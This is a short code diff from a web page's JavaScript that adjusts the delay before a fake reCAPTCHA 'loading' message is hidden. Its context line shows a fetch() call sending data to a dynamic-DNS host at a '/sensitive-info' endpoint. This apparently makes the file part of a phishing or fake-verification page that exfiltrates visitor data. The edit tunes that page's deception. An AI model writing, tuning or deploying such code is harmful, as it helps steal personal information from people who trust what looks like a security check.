@@ -461,7 +461,7 @@ fetch('https://duncanikt.ddns.net/sensitive-info', {
       // 延遲 2 秒後隱藏 "載入中..." 的文字
       setTimeout(() => {
         document.getElementById('recaptcha-loading').style.display = 'none';
-      }, 1500);
+      }, 1000);
       });
 });
 
